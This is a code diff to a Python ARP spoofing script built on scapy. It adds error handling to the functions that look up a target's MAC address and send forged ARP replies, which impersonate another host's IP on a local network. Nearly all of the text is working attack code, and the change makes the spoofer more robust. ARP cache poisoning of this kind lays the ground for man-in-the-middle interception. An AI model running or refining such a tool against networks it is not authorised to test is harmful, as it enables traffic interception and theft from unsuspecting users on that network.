@@ -9,16 +9,26 @@ def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
-    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-    return answered_list[0][1].hwsrc
+    answered_list, unanswered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)
+    print("Answered:", answered_list)
+    print("Unanswered:", unanswered_list)
+    if answered_list:
+        return answered_list[0][1].hwsrc
+    else:
+        return None
+
 
 def spoofer(target_ip, spoof_ip):
     """
     Sends a spoofed ARP response to the target IP.
     """
     target_mac = get_mac(target_ip)
+    if target_mac is None:
+        print(f"No response received for IP: {target_ip}")
+        return  # Exit the function if we didn't get a MAC address
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
+
 
 def restore(destination_ip, source_ip):
     """
